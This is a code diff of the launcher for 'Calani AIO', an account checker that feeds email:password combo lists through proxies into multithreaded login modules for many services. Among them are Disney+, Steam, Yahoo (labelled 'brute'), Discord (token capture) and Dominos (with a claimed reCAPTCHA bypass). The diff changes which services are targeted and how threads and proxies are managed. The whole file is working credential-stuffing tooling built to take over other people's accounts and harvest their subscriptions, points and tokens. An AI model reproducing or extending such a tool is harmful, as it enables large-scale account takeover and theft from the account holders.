@@ -1,11 +1,10 @@
-from modules.variables import Checker
+from modules.variables import Checker, discord
 from modules.functions import *
 from time import sleep
 from multiprocessing.dummy import Pool
 from threading import Thread
 
 from modules.checkers import nordvpn
-from modules.checkers import minecraft
 from modules.checkers import bonk_io
 from modules.checkers import disney
 from modules.checkers import duolingo
@@ -14,122 +13,115 @@ from modules.checkers import crunchyroll
 from modules.checkers import spotifyvm
 from modules.checkers import bww
 from modules.checkers import pornhub
-from modules.checkers import riot
 from modules.checkers import honeygain
 from modules.checkers import discordvm
-from modules.checkers import netflix
+from modules.checkers import discord_solver
 from modules.checkers import steam
 from modules.checkers import windscribe
 from modules.checkers import instagram
-from modules.checkers import funimation
-from modules.checkers import canva
 from modules.checkers import uplay
 from modules.checkers import paramount
-from modules.checkers import curiositystream
-from modules.checkers import wemod
-from modules.checkers import facebook
 from modules.checkers import ipvanish
-from modules.checkers import twitch
 from modules.checkers import tunnelbear
 from modules.checkers import plextv
-from modules.checkers import tlauncher
-from modules.checkers import freefire
-from modules.checkers import picsart
-from modules.checkers import nutaku
+from modules.checkers import origin
+from modules.checkers import yahoo
+from modules.checkers import dominos
+from modules.checkers import dickeys
 
 modules_list = {
-    "minecraft":minecraft,
-    "nordvpn":nordvpn,
-    "bonk.io":bonk_io,
-    "disney+":disney,
-    "duolingo":duolingo,
-    "gfuel":gfuel,
-    "crunchyroll":crunchyroll,
-    "spotifyvm":spotifyvm,
-    "bww":bww,
-    "pornhub":pornhub,
-    "riot":riot,
-    "honeygain":honeygain,
-    "discordvm":discordvm,
-    "netflix":netflix,
-    "steam":steam,
-    "windscribe":windscribe,
-    "instagram":instagram,
-    "funimation":funimation,
-    "canva":canva,
-    "uplay":uplay,
-    "paramount":paramount,
-    "curiositystream":curiositystream,
-    "wemod":wemod,
-    "facebook":facebook,
-    "ipvanish":ipvanish,
-    "twitch":twitch,
-    "tunnelbear":tunnelbear,
-    "plextv":plextv,
-    "tlauncher":tlauncher,
-    "freefire":freefire,
-    'picsart':picsart,
-    'nutaku':nutaku
+    "disney+ [full capture | us proxies]":disney,
+    "plextv [subscription capture]":plextv,
+    "duolingo [full capture]":duolingo,
+    "gfuel [full capture]":gfuel,
+    "crunchyroll [subscription capture]":crunchyroll,
+    "spotify [valid mail]":spotifyvm,
+    "bww [points capture | proxyless]":bww,
+    "dominos [points capture | recaptcha v3 bypass]":dominos,
+    "dickeys [points capture]":dickeys,
+    "pornhub [subscription capture]":pornhub,
+    "honeygain [credits capture]":honeygain,
+    'yahoo [brute]':yahoo,
+    "discord [token capture | solver]":discord_solver,
+    "discord [valid mail]":discordvm,
+    "instagram [followers capture]":instagram,
+    "bonk.io [full capture]":bonk_io,
+    "uplay [full capture]":uplay,
+    "origin [full capture]":origin,
+    "steam [full capture]":steam,
+    "paramount [full capture]":paramount,
+    "nordvpn [subscription capture]":nordvpn,
+    "windscribe [subscription capture]":windscribe,
+    "ipvanish [subscription capture]":ipvanish,
+    "tunnelbear [subscription capture]":tunnelbear,
 }
 
 def starter(modules_lst:list):
     """Starts checking accounts"""
     reset_stats()
-    set_title("Calani AIO | Getting Ready | MickeyYe#9423")
-    def foo(account:str):
-        try:
-            email = account.split(":")[0]
-            password = account.split(":")[1]
-        except:
-            Checker.bad += 1
-            Checker.cpm += 1
-            if not Checker.cui: log("bad",account,"Error")
-        else:
-            for module in modules_lst:
-                modules_list[module].check(email,password)
-            Checker.save_lines.remove(account)
+    set_title(f"Calani AIO | Getting Ready | {discord}")
+    def initializeChecker(account:str):
+        if ':' in account:
+            email,password = account.split(":")
+            if email and password:
+                for module in modules_lst:
+                    modules_list[module].check(email,password)
+                    Checker.cpm += 60
+                Checker.remaining.remove(account)
+                return
+        
+        Checker.cpm += 60
+        Checker.bad += 1
+        
 
     clear()
     ascii()
     print("\n\n")
-    print(f"    [{cyan}Pick Combo File{reset}]")
+    print(f"    [{cyan}>{reset}] Pick Combo File")
     sleep(1)
     file_path = get_file("Combo File",type="Combo File")
-    get_focus()
     if not file_path:
-        print(f"    [{cyan}No File Detected{reset}]")
+        print(f"    [{red}>{reset}] No File Detected")
         sleep(1)
         return
     with open(file_path,errors="ignore") as file:
         before_accounts = file.read().splitlines()
-        accounts = list(set(before_accounts))
-        Checker.accounts = list(set(before_accounts))
-        Checker.save_lines = list(set(before_accounts))
-        duplicates = len(before_accounts)-len(accounts)
-    print(f"    [{cyan}Imported {len(before_accounts)} Accounts{reset}]")
+        after_accounts = list(set(before_accounts))
+        Checker.accounts = after_accounts.copy()
+        Checker.remaining = after_accounts.copy()
+        Checker.total_accounts = len(Checker.accounts)
+        duplicates = len(before_accounts)-len(after_accounts)
+    if not after_accounts:
+        print(f"    [{red}>{reset}] No Accounts Detected")
+        sleep(1)
+        return
+    print(f"    [{cyan}>{reset}] Imported {green}{len(before_accounts)}{reset} Accounts")
     if duplicates != 0:
-        print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
+        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
     sleep(1)
 
     print("\n")
 
-    print(f"    [{cyan}Pick Proxy File{reset}]")
+    print(f"    [{cyan}>{reset}] Pick Proxy File")
     sleep(1)
     file_path = get_file("Proxy File File",type="Proxy File")
-    get_focus()
     if not file_path:
-        print(f"    [{cyan}No File Detected{reset}]")
+        print(f"    [{red}>{reset}] No File Detected")
         sleep(1)
         return
     with open(file_path,errors="ignore") as file:
-        contents = file.read()
-        before_proxies = contents.splitlines()
+        before_proxies = file.read().splitlines()
         after_proxies = list(set(before_proxies))
         Checker.proxies = after_proxies
+        Checker.total_proxies = len(Checker.proxies)
         duplicates = len(before_proxies)-len(after_proxies)
-    print(f"    [{cyan}Imported {len(before_proxies)} Proxies{reset}]")
+    if not after_proxies:
+        print(f"    [{red}>{reset}] No Proxies Detected")
+        sleep(1)
+        return
+    print(f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies")
     if duplicates != 0:
-        print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
+        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
     sleep(1)
 
     Checker.checking = True
@@ -144,12 +136,13 @@ def starter(modules_lst:list):
         ascii()
         print("\n\n")
     else: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
+    if Checker.total_proxies > Checker.threads: Checker.lockProxies = True
     mainpool = Pool(processes=Checker.threads)
-    mainpool.imap_unordered(func=foo,iterable=Checker.accounts)
+    mainpool.imap_unordered(func=initializeChecker,iterable=Checker.accounts)
     mainpool.close()
     mainpool.join()
     sleep(5)
     Checker.checking = False
     print("\n\n")
-    print(f"    [{cyan}Finished Checking{reset}]")
-    input(f"    [{cyan}Press Enter To Go Back{reset}]")
+    print(f"    [{cyan}>{reset}] Finished Checking")
+    input(f"    [{cyan}>{reset}] Press Enter To Go Back")
